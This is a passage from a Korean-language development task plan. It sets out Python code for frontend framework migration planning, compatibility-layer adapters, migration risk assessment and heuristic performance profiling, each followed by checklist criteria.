                "Migration team assembled",
                "Training plan approved"
            ],
            rollback_plan={
                'trigger': 'Major blocking issues discovered',
                'actions': ['Postpone migration', 'Re-evaluate framework choice'],
                'decision_maker': 'tech_lead'
            },
            resources_required={
                'developers': 2,
                'architects': 1,
                'project_managers': 1
            }
        )

    async def _create_module_migration_phases(
        self,
        project_analysis: Dict[str, Any],
        target_framework: str,
        start_date: datetime
    ) -> List[MigrationPhase]:
        """모듈별 마이그레이션 단계 생성"""

        modules = project_analysis.get('modules', [])
        module_phases = []
        current_date = start_date

        # 모듈 우선순위 정렬
        sorted_modules = self._prioritize_modules(modules)

        for idx, module in enumerate(sorted_modules):
            duration = self._estimate_module_migration_duration(module)

            phase = MigrationPhase(
                phase_number=4 + idx,
                name=f"Migrate {module['name']} Module",
                start_date=current_date,
                end_date=current_date + timedelta(days=duration),
                objectives=[
                    f"Complete migration of {module['name']}",
                    "Maintain feature parity",
                    "Pass all regression tests",
                    "Update documentation"
                ],
                tasks=self._create_module_tasks(module, target_framework),
                dependencies=[3] if idx == 0 else [3, 4 + idx - 1],
                success_criteria=[
                    "All components migrated",
                    "100% test coverage",
                    "Performance benchmarks met",
                    "No regression issues"
                ],
                rollback_plan={
                    'trigger': 'Critical functionality broken',
                    'actions': [
                        'Revert to previous version',
                        'Isolate module with feature flag',
                        'Fix issues before retry'
                    ],
                    'decision_maker': 'tech_lead'
                },
                resources_required=self._calculate_module_resources(module)
            )

            module_phases.append(phase)

            # 병렬 실행 가능한 경우 날짜 조정
            if self._can_parallelize(module, sorted_modules):
                current_date = current_date  # 동일 시작일
            else:
                current_date = phase.end_date + timedelta(days=1)

        return module_phases

    def _create_migration_gantt_chart(
        self,
        phases: List[MigrationPhase]
    ) -> Dict[str, Any]:
        """마이그레이션 간트 차트 데이터 생성"""

        gantt_data = {
            'project_name': 'Framework Migration Plan',
            'start_date': phases[0].start_date.isoformat(),
            'end_date': phases[-1].end_date.isoformat(),
            'phases': []
        }

        for phase in phases:
            phase_data = {
                'id': f'phase_{phase.phase_number}',
                'name': phase.name,
                'start': phase.start_date.isoformat(),
                'end': phase.end_date.isoformat(),
                'dependencies': [f'phase_{dep}' for dep in phase.dependencies],
                'progress': 0,
                'resources': phase.resources_required,
                'tasks': []
            }

            for task in phase.tasks:
                task_data = {
                    'id': task['id'],
                    'name': task['name'],
                    'duration': task['duration'],
                    'assigned_to': task['assigned_to'],
                    'status': 'planned'
                }
                phase_data['tasks'].append(task_data)

            gantt_data['phases'].append(phase_data)

        return gantt_data
```

**검증 기준**:

- [ ] 단계별 상세 계획
- [ ] 작업 분해 구조(WBS)
- [ ] 리소스 할당 계획
- [ ] 롤백 전략 포함

### SubTask 4.16.3: 호환성 레이어 설계

**담당자**: 시스템 아키텍트  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/compatibility_layer_designer.py
from typing import Dict, List, Optional, Any, Callable
from abc import ABC, abstractmethod
import ast

class CompatibilityLayer(ABC):
    """호환성 레이어 베이스 클래스"""

    @abstractmethod
    async def transform(self, source_code: str) -> str:
        """소스 코드 변환"""
        pass

    @abstractmethod
    async def adapt_api(self, api_call: Dict[str, Any]) -> Dict[str, Any]:
        """API 호출 어댑터"""
        pass

    @abstractmethod
    async def bridge_events(self, event: Dict[str, Any]) -> Dict[str, Any]:
        """이벤트 시스템 브릿지"""
        pass

class CompatibilityLayerDesigner:
    """프레임워크 간 호환성 레이어 설계"""

    async def design_compatibility_layer(
        self,
        source_framework: str,
        target_framework: str,
        project_analysis: Dict[str, Any]
    ) -> Dict[str, Any]:
        """호환성 레이어 설계"""

        # 1. 호환성 요구사항 분석
        compatibility_needs = await self._analyze_compatibility_needs(
            source_framework,
            target_framework,
            project_analysis
        )

        # 2. 어댑터 패턴 설계
        adapters = await self._design_adapters(
            compatibility_needs,
            source_framework,
            target_framework
        )

        # 3. 브릿지 컴포넌트 설계
        bridges = await self._design_bridges(
            compatibility_needs,
            project_analysis
        )

        # 4. 변환 규칙 정의
        transformation_rules = await self._define_transformation_rules(
            source_framework,
            target_framework
        )

        # 5. 폴리필 및 심 레이어
        polyfills = await self._identify_polyfills(
            source_framework,
            target_framework,
            project_analysis
        )

        return {
            'compatibility_needs': compatibility_needs,
            'adapters': adapters,
            'bridges': bridges,
            'transformation_rules': transformation_rules,
            'polyfills': polyfills,
            'implementation_guide': await self._create_implementation_guide(
                adapters,
                bridges,
                transformation_rules
            )
        }

    async def _design_adapters(
        self,
        compatibility_needs: Dict[str, Any],
        source_framework: str,
        target_framework: str
    ) -> List[Dict[str, Any]]:
        """어댑터 패턴 설계"""

        adapters = []

        # 컴포넌트 생명주기 어댑터
        if compatibility_needs.get('lifecycle_differences'):
            adapters.append({
                'name': 'LifecycleAdapter',
                'type': 'component_lifecycle',
                'source_methods': self._get_lifecycle_methods(source_framework),
                'target_methods': self._get_lifecycle_methods(target_framework),
                'mapping': self._create_lifecycle_mapping(
                    source_framework,
                    target_framework
                ),
                'implementation': self._generate_lifecycle_adapter_code(
                    source_framework,
                    target_framework
                )
            })

        # 상태 관리 어댑터
        if compatibility_needs.get('state_management_differences'):
            adapters.append({
                'name': 'StateAdapter',
                'type': 'state_management',
                'source_pattern': self._get_state_pattern(source_framework),
                'target_pattern': self._get_state_pattern(target_framework),
                'implementation': self._generate_state_adapter_code(
                    source_framework,
                    target_framework
                )
            })

        # 라우팅 어댑터
        if compatibility_needs.get('routing_differences'):
            adapters.append({
                'name': 'RoutingAdapter',
                'type': 'routing',
                'implementation': self._generate_routing_adapter_code(
                    source_framework,
                    target_framework
                )
            })

        # 이벤트 시스템 어댑터
        if compatibility_needs.get('event_system_differences'):
            adapters.append({
                'name': 'EventAdapter',
                'type': 'events',
                'implementation': self._generate_event_adapter_code(
                    source_framework,
                    target_framework
                )
            })

        return adapters

    def _generate_lifecycle_adapter_code(
        self,
        source: str,
        target: str
    ) -> str:
        """생명주기 어댑터 코드 생성"""

        if source == 'angular.js' and target == 'react':
            return '''
class AngularToReactLifecycleAdapter {
    constructor(component) {
        this.component = component;
        this.scope = {};
        this._watchers = [];
    }

    // Angular.js $onInit -> React componentDidMount
    $onInit() {
        if (this.component.componentDidMount) {
            this.component.componentDidMount();
        }
    }

    // Angular.js $onDestroy -> React componentWillUnmount
    $onDestroy() {
        if (this.component.componentWillUnmount) {
            this.component.componentWillUnmount();
        }
        this._cleanupWatchers();
    }

    // Angular.js $watch -> React state/props observation
    $watch(expression, callback) {
        const watcher = {
            expression,
            callback,
            lastValue: undefined
        };
        this._watchers.push(watcher);
        return () => this._removeWatcher(watcher);
    }

    // Digest cycle simulation for gradual migration
    $digest() {
        this._watchers.forEach(watcher => {
            const newValue = this._evaluate(watcher.expression);
            if (newValue !== watcher.lastValue) {
                watcher.callback(newValue, watcher.lastValue);
                watcher.lastValue = newValue;
            }
        });
    }

    _evaluate(expression) {
        // Evaluate expression in current context
        return typeof expression === 'function'
            ? expression(this.scope)
            : this.scope[expression];
    }
}
'''
        elif source == 'vue' and target == 'react':
            return '''
class VueToReactAdapter {
    constructor(vueComponent) {
        this.vueComponent = vueComponent;
        this.state = {};
        this.computedCache = new Map();
    }

    // Vue created -> React constructor
    created() {
        this.initializeState();
        this.setupComputed();
        this.setupWatchers();
    }

    // Vue mounted -> React componentDidMount
    mounted() {
        if (this.componentDidMount) {
            this.componentDidMount();
        }
    }

    // Vue data -> React state
    initializeState() {
        const data = typeof this.vueComponent.data === 'function'
            ? this.vueComponent.data()
            : this.vueComponent.data || {};

        this.state = { ...data };
    }

    // Vue computed -> React derived state
    setupComputed() {
        const computed = this.vueComponent.computed || {};

        Object.keys(computed).forEach(key => {
            Object.defineProperty(this, key, {
                get() {
                    if (!this.computedCache.has(key)) {
                        const value = computed[key].call(this);
                        this.computedCache.set(key, value);
                    }
                    return this.computedCache.get(key);
                }
            });
        });
    }

    // Vue watch -> React effect simulation
    setupWatchers() {
        const watch = this.vueComponent.watch || {};

        Object.keys(watch).forEach(key => {
            let oldValue = this.state[key];

            // Create getter/setter for watched property
            Object.defineProperty(this.state, key, {
                get() {
                    return oldValue;
                },
                set(newValue) {
                    const handler = watch[key];
                    if (typeof handler === 'function') {
                        handler.call(this, newValue, oldValue);
                    } else if (handler.handler) {
                        handler.handler.call(this, newValue, oldValue);
                    }
                    oldValue = newValue;
                }
            });
        });
    }
}
'''

        return '// Adapter implementation needed'

    async def _design_bridges(
        self,
        compatibility_needs: Dict[str, Any],
        project_analysis: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """브릿지 컴포넌트 설계"""

        bridges = []

        # API 통신 브릿지
        if compatibility_needs.get('api_pattern_differences'):
            bridges.append({
                'name': 'APIBridge',
                'type': 'api_communication',
                'purpose': 'Standardize API calls across frameworks',
                'interface': {
                    'methods': ['get', 'post', 'put', 'delete'],
                    'interceptors': ['request', 'response', 'error'],
                    'transformers': ['requestData', 'responseData']
                },
                'implementation': '''
class APIBridge {
    constructor(config = {}) {
        this.baseURL = config.baseURL || '';
        this.interceptors = {
            request: [],
            response: [],
            error: []
        };
    }

    async request(config) {
        // Apply request interceptors
        for (const interceptor of this.interceptors.request) {
            config = await interceptor(config);
        }

        try {
            const response = await fetch(this.baseURL + config.url, {
                method: config.method,
                headers: config.headers,
                body: JSON.stringify(config.data)
            });

            let result = await response.json();

            // Apply response interceptors
            for (const interceptor of this.interceptors.response) {
                result = await interceptor(result);
            }

            return result;
        } catch (error) {
            // Apply error interceptors
            for (const interceptor of this.interceptors.error) {
                error = await interceptor(error);
            }
            throw error;
        }
    }

    get(url, config = {}) {
        return this.request({ ...config, method: 'GET', url });
    }

    post(url, data, config = {}) {
        return this.request({ ...config, method: 'POST', url, data });
    }
}
'''
            })

        # 상태 동기화 브릿지
        if compatibility_needs.get('state_sync_required'):
            bridges.append({
                'name': 'StateSyncBridge',
                'type': 'state_synchronization',
                'purpose': 'Sync state between old and new components',
                'implementation': self._generate_state_sync_bridge()
            })

        return bridges

    async def _define_transformation_rules(
        self,
        source: str,
        target: str
    ) -> List[Dict[str, Any]]:
        """코드 변환 규칙 정의"""

        rules = []

        if source == 'angular.js' and target == 'react':
            rules.extend([
                {
                    'name': 'directive_to_component',
                    'pattern': r'\.directive\s*\(\s*[\'"](\w+)[\'"]',
                    'transform': self._angular_directive_to_react_component,
                    'description': 'Convert Angular directives to React components'
                },
                {
                    'name': 'controller_to_component',
                    'pattern': r'\.controller\s*\(\s*[\'"](\w+)[\'"]',
                    'transform': self._angular_controller_to_react_component,
                    'description': 'Convert Angular controllers to React components'
                },
                {
                    'name': 'service_to_hook',
                    'pattern': r'\.service\s*\(\s*[\'"](\w+)[\'"]',
                    'transform': self._angular_service_to_react_hook,
                    'description': 'Convert Angular services to React hooks'
                }
            ])

        elif source == 'jquery' and target == 'react':
            rules.extend([
                {
                    'name': 'dom_manipulation_to_state',
                    'pattern': r'\$\([\'"]([^\'"])+[\'"]\)\.(html|text|val)\(',
                    'transform': self._jquery_dom_to_react_state,
                    'description': 'Convert jQuery DOM manipulation to React state'
                },
                {
                    'name': 'event_handler_to_react',
                    'pattern': r'\$\([\'"]([^\'"])+[\'"]\)\.on\([\'"](\w+)[\'"]',
                    'transform': self._jquery_event_to_react_handler,
                    'description': 'Convert jQuery events to React event handlers'
                }
            ])

        return rules
```

**검증 기준**:

- [ ] 주요 프레임워크 간 어댑터
- [ ] API 통신 브릿지
- [ ] 상태 동기화 메커니즘
- [ ] 코드 변환 규칙 엔진

### SubTask 4.16.4: 리스크 평가 및 완화

**담당자**: 리스크 관리자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/migration_risk_assessor.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import numpy as np

class RiskLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class MigrationRisk:
    """마이그레이션 리스크"""
    id: str
    category: str
    description: str
    probability: float  # 0-1
    impact: float  # 0-1
    risk_score: float  # probability * impact
    level: RiskLevel
    affected_areas: List[str]
    mitigation_strategies: List[Dict[str, Any]]
    contingency_plans: List[Dict[str, Any]]
    monitoring_metrics: List[str]

class MigrationRiskAssessor:
    """마이그레이션 리스크 평가 및 완화"""

    RISK_CATEGORIES = {
        'technical': {
            'weight': 0.3,
            'factors': [
                'architecture_mismatch',
                'performance_degradation',
                'feature_incompatibility',
                'integration_complexity'
            ]
        },
        'business': {
            'weight': 0.25,
            'factors': [
                'service_disruption',
                'customer_impact',
                'revenue_loss',
                'market_timing'
            ]
        },
        'resource': {
            'weight': 0.2,
            'factors': [
                'skill_gap',
                'team_availability',
                'budget_overrun',
                'timeline_delay'
            ]
        },
        'operational': {
            'weight': 0.15,
            'factors': [
                'deployment_failure',
                'rollback_complexity',
                'monitoring_gaps',
                'documentation_lag'
            ]
        },
        'security': {
            'weight': 0.1,
            'factors': [
                'vulnerability_exposure',
                'compliance_breach',
                'data_loss',
                'access_control'
            ]
        }
    }

    async def assess_migration_risks(
        self,
        migration_plan: Dict[str, Any],
        project_context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """마이그레이션 리스크 종합 평가"""

        # 1. 리스크 식별
        identified_risks = await self._identify_risks(
            migration_plan,
            project_context
        )

        # 2. 리스크 분석 및 평가
        evaluated_risks = await self._evaluate_risks(
            identified_risks,
            project_context
        )

        # 3. 리스크 우선순위화
        prioritized_risks = self._prioritize_risks(evaluated_risks)

        # 4. 완화 전략 수립
        mitigation_plan = await self._develop_mitigation_strategies(
            prioritized_risks,
            migration_plan
        )

        # 5. 모니터링 계획 수립
        monitoring_plan = await self._create_monitoring_plan(
            prioritized_risks
        )

        # 6. 리스크 대시보드 생성
        risk_dashboard = self._create_risk_dashboard(
            prioritized_risks,
            mitigation_plan
        )

        return {
            'total_risks': len(evaluated_risks),
            'risk_summary': self._summarize_risks(evaluated_risks),
            'critical_risks': [r for r in prioritized_risks if r.level == RiskLevel.CRITICAL],
            'high_risks': [r for r in prioritized_risks if r.level == RiskLevel.HIGH],
            'mitigation_plan': mitigation_plan,
            'monitoring_plan': monitoring_plan,
            'risk_dashboard': risk_dashboard,
            'overall_risk_score': self._calculate_overall_risk_score(evaluated_risks)
        }

    async def _identify_risks(
        self,
        migration_plan: Dict[str, Any],
        project_context: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """리스크 식별"""

        risks = []

        # 기술적 리스크 식별
        tech_risks = await self._identify_technical_risks(
            migration_plan,
            project_context
        )
        risks.extend(tech_risks)

        # 비즈니스 리스크 식별
        business_risks = await self._identify_business_risks(
            migration_plan,
            project_context
        )
        risks.extend(business_risks)

        # 리소스 리스크 식별
        resource_risks = await self._identify_resource_risks(
            migration_plan,
            project_context
        )
        risks.extend(resource_risks)

        # 운영 리스크 식별
        operational_risks = await self._identify_operational_risks(
            migration_plan
        )
        risks.extend(operational_risks)

        # 보안 리스크 식별
        security_risks = await self._identify_security_risks(
            migration_plan,
            project_context
        )
        risks.extend(security_risks)

        return risks

    async def _identify_technical_risks(
        self,
        migration_plan: Dict[str, Any],
        project_context: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """기술적 리스크 식별"""

        risks = []

        # 아키텍처 불일치 리스크
        if migration_plan.get('architecture_change_required'):
            risks.append({
                'id': 'TECH_001',
                'category': 'technical',
                'description': 'Significant architecture changes may introduce instability',
                'probability': 0.7,
                'impact': 0.8,
                'affected_areas': ['system_stability', 'performance', 'scalability']
            })

        # 성능 저하 리스크
        framework_overhead = migration_plan.get('expected_performance_impact', 0)
        if framework_overhead > 0.2:  # 20% 이상 오버헤드
            risks.append({
                'id': 'TECH_002',
                'category': 'technical',
                'description': 'Framework migration may cause performance degradation',
                'probability': 0.6,
                'impact': 0.7,
                'affected_areas': ['user_experience', 'system_resources']
            })

        # 기능 호환성 리스크
        incompatible_features = migration_plan.get('incompatible_features', [])
        if incompatible_features:
            risks.append({
                'id': 'TECH_003',
                'category': 'technical',
                'description': f'{len(incompatible_features)} features require reimplementation',
                'probability': 0.8,
                'impact': 0.6,
                'affected_areas': incompatible_features
            })

        # 통합 복잡도 리스크
        integration_points = project_context.get('external_integrations', [])
        if len(integration_points) > 5:
            risks.append({
                'id': 'TECH_004',
                'category': 'technical',
                'description': 'Multiple integration points increase migration complexity',
                'probability': 0.7,
                'impact': 0.7,
                'affected_areas': integration_points
            })

        return risks

    async def _develop_mitigation_strategies(
        self,
        risks: List[MigrationRisk],
        migration_plan: Dict[str, Any]
    ) -> Dict[str, Any]:
        """리스크 완화 전략 개발"""

        mitigation_strategies = {
            'strategies': [],
            'resource_requirements': {},
            'timeline_impact': 0,
            'cost_impact': 0
        }

        for risk in risks:
            if risk.level in [RiskLevel.CRITICAL, RiskLevel.HIGH]:
                strategy = await self._create_mitigation_strategy(risk, migration_plan)
                mitigation_strategies['strategies'].append(strategy)

                # 리소스 요구사항 집계
                for resource, amount in strategy['resources'].items():
                    if resource not in mitigation_strategies['resource_requirements']:
                        mitigation_strategies['resource_requirements'][resource] = 0
                    mitigation_strategies['resource_requirements'][resource] += amount

                # 일정 및 비용 영향 계산
                mitigation_strategies['timeline_impact'] += strategy['timeline_days']
                mitigation_strategies['cost_impact'] += strategy['estimated_cost']

        return mitigation_strategies

    async def _create_mitigation_strategy(
        self,
        risk: MigrationRisk,
        migration_plan: Dict[str, Any]
    ) -> Dict[str, Any]:
        """개별 리스크 완화 전략 생성"""

        strategy = {
            'risk_id': risk.id,
            'risk_description': risk.description,
            'mitigation_actions': [],
            'resources': {},
            'timeline_days': 0,
            'estimated_cost': 0,
            'success_metrics': []
        }

        # 리스크 카테고리별 완화 전략
        if risk.category == 'technical':
            if 'architecture' in risk.description.lower():
                strategy['mitigation_actions'].extend([
                    'Implement compatibility layer',
                    'Gradual component migration',
                    'Extensive integration testing',
                    'Performance monitoring setup'
                ])
                strategy['resources'] = {'senior_developers': 2, 'architects': 1}
                strategy['timeline_days'] = 14
                strategy['success_metrics'] = [
                    'Zero critical bugs in compatibility layer',
                    'Performance within 10% of baseline'
                ]

            elif 'performance' in risk.description.lower():
                strategy['mitigation_actions'].extend([
                    'Performance profiling and optimization',
                    'Implement caching strategies',
                    'Code splitting and lazy loading',
                    'CDN setup for static assets'
                ])
                strategy['resources'] = {'performance_engineers': 1, 'developers': 2}
                strategy['timeline_days'] = 10
                strategy['success_metrics'] = [
                    'Page load time < 3 seconds',
                    'Time to interactive < 5 seconds'
                ]

        elif risk.category == 'business':
            if 'service_disruption' in risk.description.lower():
                strategy['mitigation_actions'].extend([
                    'Blue-green deployment setup',
                    'Feature flag implementation',
                    'Gradual rollout plan',
                    'Customer communication plan'
                ])
                strategy['resources'] = {'devops': 2, 'product_managers': 1}
                strategy['timeline_days'] = 7
                strategy['success_metrics'] = [
                    'Zero downtime during migration',
                    'Customer satisfaction > 90%'
                ]

        elif risk.category == 'resource':
            if 'skill_gap' in risk.description.lower():
                strategy['mitigation_actions'].extend([
                    'Team training program',
                    'External consultant engagement',
                    'Pair programming sessions',
                    'Knowledge documentation'
                ])
                strategy['resources'] = {'trainers': 1, 'consultants': 2}
                strategy['timeline_days'] = 21
                strategy['estimated_cost'] = 50000
                strategy['success_metrics'] = [
                    'Team competency score > 80%',
                    'Code review pass rate > 90%'
                ]

        return strategy

    def _create_risk_dashboard(
        self,
        risks: List[MigrationRisk],
        mitigation_plan: Dict[str, Any]
    ) -> Dict[str, Any]:
        """리스크 대시보드 생성"""

        # 리스크 매트릭스 생성
        risk_matrix = self._create_risk_matrix(risks)

        # 카테고리별 분포
        category_distribution = {}
        for risk in risks:
            if risk.category not in category_distribution:
                category_distribution[risk.category] = 0
            category_distribution[risk.category] += 1

        # 시간에 따른 리스크 추이
        risk_timeline = self._project_risk_timeline(risks, mitigation_plan)

        return {
            'risk_matrix': risk_matrix,
            'category_distribution': category_distribution,
            'risk_timeline': risk_timeline,
            'top_risks': risks[:5],  # 상위 5개 리스크
            'mitigation_coverage': self._calculate_mitigation_coverage(
                risks,
                mitigation_plan
            ),
            'residual_risk_score': self._calculate_residual_risk(
                risks,
                mitigation_plan
            )
        }
```

**리스크 매트릭스 시각화**:

```python
def _create_risk_matrix(self, risks: List[MigrationRisk]) -> Dict[str, Any]:
    """리스크 매트릭스 생성"""

    matrix = {
        'high_probability_high_impact': [],
        'high_probability_medium_impact': [],
        'high_probability_low_impact': [],
        'medium_probability_high_impact': [],
        'medium_probability_medium_impact': [],
        'medium_probability_low_impact': [],
        'low_probability_high_impact': [],
        'low_probability_medium_impact': [],
        'low_probability_low_impact': []
    }

    for risk in risks:
        prob_level = 'high' if risk.probability > 0.7 else 'medium' if risk.probability > 0.4 else 'low'
        impact_level = 'high' if risk.impact > 0.7 else 'medium' if risk.impact > 0.4 else 'low'

        key = f'{prob_level}_probability_{impact_level}_impact'
        matrix[key].append({
            'id': risk.id,
            'description': risk.description[:50] + '...',
            'score': risk.risk_score
        })

    return matrix
```

**검증 기준**:

- [ ] 5개 카테고리 리스크 평가
- [ ] 리스크 매트릭스 생성
- [ ] 완화 전략 자동 생성
- [ ] 모니터링 메트릭 정의

## Task 4.17: 성능 및 확장성 분석

### SubTask 4.17.1: 프레임워크 성능 프로파일링

**담당자**: 성능 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/performance_profiler.py
from typing import Dict, List, Optional, Any, Tuple
import asyncio
import time
from dataclasses import dataclass
import aiohttp

@dataclass
class PerformanceMetrics:
    """성능 메트릭"""
    framework: str
    initial_load_time: float  # ms
    time_to_interactive: float  # ms
    bundle_size: int  # bytes
    memory_usage: Dict[str, float]  # MB
    cpu_usage: Dict[str, float]  # percentage
    rendering_performance: Dict[str, float]
    network_requests: int
    cache_efficiency: float

class FrameworkPerformanceProfiler:
    """프레임워크 성능 프로파일링"""

    PERFORMANCE_BENCHMARKS = {
        'react': {
            'bundle_size_baseline': 45000,  # 45KB gzipped
            'initial_load_baseline': 1500,   # 1.5s
            'memory_baseline': 20,           # 20MB
            'rendering_speed': 'fast',
            'optimization_potential': 'high'
        },
        'vue': {
            'bundle_size_baseline': 34000,  # 34KB gzipped
            'initial_load_baseline': 1200,   # 1.2s
            'memory_baseline': 15,           # 15MB
            'rendering_speed': 'fast',
            'optimization_potential': 'high'
        },
        'angular': {
            'bundle_size_baseline': 130000,  # 130KB gzipped
            'initial_load_baseline': 2000,    # 2s
            'memory_baseline': 35,            # 35MB
            'rendering_speed': 'fast',
            'optimization_potential': 'medium'
        },
        'svelte': {
            'bundle_size_baseline': 10000,   # 10KB gzipped
            'initial_load_baseline': 800,     # 0.8s
            'memory_baseline': 10,            # 10MB
            'rendering_speed': 'very_fast',
            'optimization_potential': 'low'
        }
    }

    async def profile_framework_performance(
        self,
        framework: str,
        application_profile: Dict[str, Any]
    ) -> PerformanceMetrics:
        """프레임워크 성능 프로파일링"""

        # 1. 번들 크기 분석
        bundle_metrics = await self._analyze_bundle_size(
            framework,
            application_profile
        )

        # 2. 로딩 성능 측정
        loading_metrics = await self._measure_loading_performance(
            framework,
            application_profile
        )

        # 3. 런타임 성능 측정
        runtime_metrics = await self._measure_runtime_performance(
            framework,
            application_profile
        )

        # 4. 메모리 사용량 분석
        memory_metrics = await self._analyze_memory_usage(
            framework,
            application_profile
        )

        # 5. 렌더링 성능 측정
        rendering_metrics = await self._measure_rendering_performance(
            framework,
            application_profile
        )

        return PerformanceMetrics(
            framework=framework,
            initial_load_time=loading_metrics['initial_load'],
            time_to_interactive=loading_metrics['tti'],
            bundle_size=bundle_metrics['total_size'],
            memory_usage=memory_metrics,
            cpu_usage=runtime_metrics['cpu_usage'],
            rendering_performance=rendering_metrics,
            network_requests=loading_metrics['request_count'],
            cache_efficiency=bundle_metrics['cache_efficiency']
        )

    async def _analyze_bundle_size(
        self,
        framework: str,
        app_profile: Dict[str, Any]
    ) -> Dict[str, Any]:
        """번들 크기 분석"""

        baseline = self.PERFORMANCE_BENCHMARKS[framework]['bundle_size_baseline']

        # 컴포넌트 수에 따른 크기 추정
        component_count = app_profile.get('component_count', 10)
        avg_component_size = 2000  # 2KB per component

        # 의존성에 따른 크기 추가
        dependencies = app_profile.get('dependencies', [])
        dependency_sizes = {
            'state_management': 15000,  # Redux, Vuex, etc.
            'router': 10000,
            'ui_library': 50000,
            'form_library': 20000,
            'http_client': 8000
        }

        total_dependency_size = sum(
            dependency_sizes.get(dep, 5000)
            for dep in dependencies
        )

        # 코드 스플리팅 효과
        code_splitting_enabled = app_profile.get('code_splitting', False)
        splitting_reduction = 0.3 if code_splitting_enabled else 0

        # 트리 쉐이킹 효과
        tree_shaking_enabled = framework != 'angular' or app_profile.get('ivy', True)
        shaking_reduction = 0.2 if tree_shaking_enabled else 0

        # 최종 번들 크기 계산
        total_size = baseline + (component_count * avg_component_size) + total_dependency_size
        total_size *= (1 - splitting_reduction) * (1 - shaking_reduction)

        # 압축률 계산
        gzip_ratio = 0.3  # 일반적으로 70% 압축
        gzipped_size = total_size * gzip_ratio

        return {
            'total_size': int(total_size),
            'gzipped_size': int(gzipped_size),
            'breakdown': {
                'framework': baseline,
                'components': component_count * avg_component_size,
                'dependencies': total_dependency_size
            },
            'optimizations': {
                'code_splitting': code_splitting_enabled,
                'tree_shaking': tree_shaking_enabled,
                'compression': 'gzip'
            },
            'cache_efficiency': 0.8 if code_splitting_enabled else 0.5
        }

    async def _measure_loading_performance(
        self,
        framework: str,
        app_profile: Dict[str, Any]
    ) -> Dict[str, Any]:
        """로딩 성능 측정"""

        baseline_load = self.PERFORMANCE_BENCHMARKS[framework]['initial_load_baseline']

        # 네트워크 조건 고려
        network_speed = app_profile.get('target_network', '4g')
        network_multipliers = {
            '4g': 1.0,
            '3g': 2.5,
            'slow_3g': 5.0
        }

        network_factor = network_multipliers.get(network_speed, 1.0)

        # 리소스 수에 따른 지연
        resource_count = (
            app_profile.get('image_count', 10) +
            app_profile.get('font_count', 2) +
            app_profile.get('api_calls_on_load', 3)
        )

        resource_delay = resource_count * 50 * network_factor  # 50ms per resource

        # SSR/SSG 최적화
        rendering_mode = app_profile.get('rendering_mode', 'csr')
        rendering_optimization = {
            'csr': 0,      # Client-side rendering
            'ssr': -500,   # Server-side rendering
            'ssg': -700,   # Static site generation
            'isr': -600    # Incremental static regeneration
        }

        optimization_bonus = rendering_optimization.get(rendering_mode, 0)

        # 최종 로딩 시간 계산
        initial_load = baseline_load * network_factor + resource_delay + optimization_bonus
        initial_load = max(initial_load, 500)  # 최소 500ms

        # Time to Interactive (TTI)
        js_execution_time = app_profile.get('component_count', 10) * 20  # 20ms per component
        tti = initial_load + js_execution_time

        return {
            'initial_load': initial_load,
            'tti': tti,
            'first_contentful_paint': initial_load * 0.6,
            'largest_contentful_paint': initial_load * 0.8,
            'request_count': resource_count + 5,  # +5 for framework resources
            'critical_path_length': 3 if rendering_mode == 'csr' else 2
        }

    async def _measure_runtime_performance(
        self,
        framework: str,
        app_profile: Dict[str, Any]
    ) -> Dict[str, Any]:
        """런타임 성능 측정"""

        # 기본 CPU 사용률
        base_cpu = {
            'react': 15,
            'vue': 12,
            'angular': 18,
            'svelte': 8
        }.get(framework, 15)

        # 컴포넌트 복잡도에 따른 CPU 사용
        complexity = app_profile.get('complexity', 'medium')
        complexity_multipliers = {
            'low': 0.7,
            'medium': 1.0,
            'high': 1.5
        }

        cpu_usage = base_cpu * complexity_multipliers.get(complexity, 1.0)

        # 반응성 시스템 오버헤드
        reactive_data_points = app_profile.get('reactive_data_points', 50)
        reactivity_overhead = reactive_data_points * 0.1  # 0.1% per reactive data point

        # 최종 CPU 사용률
        total_cpu = cpu_usage + reactivity_overhead

        return {
            'cpu_usage': {
                'idle': total_cpu * 0.3,
                'active': total_cpu,
                'peak': total_cpu * 1.5
            },
            'event_handling_latency': 16 if framework == 'svelte' else 33,  # ms
            'state_update_cost': reactive_data_points * 0.5,  # ms
            'render_cycle_time': {
                'react': 16,
                'vue': 16,
                'angular': 20,
                'svelte': 10
            }.get(framework, 16)
        }
```

**성능 비교 차트 생성**:

```python
async def create_performance_comparison(
    self,
    frameworks: List[str],
    app_profile: Dict[str, Any]
) -> Dict[str, Any]:
    """프레임워크 성능 비교"""

    comparisons = {}

    for framework in frameworks:
        metrics = await self.profile_framework_performance(
            framework,
            app_profile
        )

        comparisons[framework] = {
            'overall_score': self._calculate_performance_score(metrics),
            'strengths': self._identify_strengths(metrics),
            'weaknesses': self._identify_weaknesses(metrics),
            'optimization_tips': self._generate_optimization_tips(
                framework,
                metrics
            )
        }

    return {
        'performance_rankings': sorted(
            comparisons.items(),
            key=lambda x: x[1]['overall_score'],
            reverse=True
        ),
        'detailed_metrics': comparisons,
        'recommendations': self._generate_performance_recommendations(
            comparisons,
            app_profile
        )
    }
```

**검증 기준**:

- [ ] 주요 성능 메트릭 측정
- [ ] 프레임워크별 벤치마크
- [ ] 네트워크 조건 시뮬레이션
- [ ] 최적화 권장사항 생성

### SubTask 4.17.2: 확장성 패턴 분석

**담당자**: 시스템 아키텍트  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/scalability_analyzer.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum

@dataclass
class ScalabilityProfile:
    """확장성 프로필"""
    framework: str
    horizontal_scalability: float  # 0-1
    vertical_scalability: float    # 0-1
    code_modularity: float        # 0-1
    team_scalability: float       # 0-1
    data_flow_efficiency: float   # 0-1
    architectural_patterns: List[str]
    bottlenecks: List[Dict[str, Any]]
    scaling_strategies: List[Dict[str, Any]]

class ScalabilityAnalyzer:
    """프레임워크 확장성 분석"""

    SCALABILITY_PATTERNS = {
        'react': {
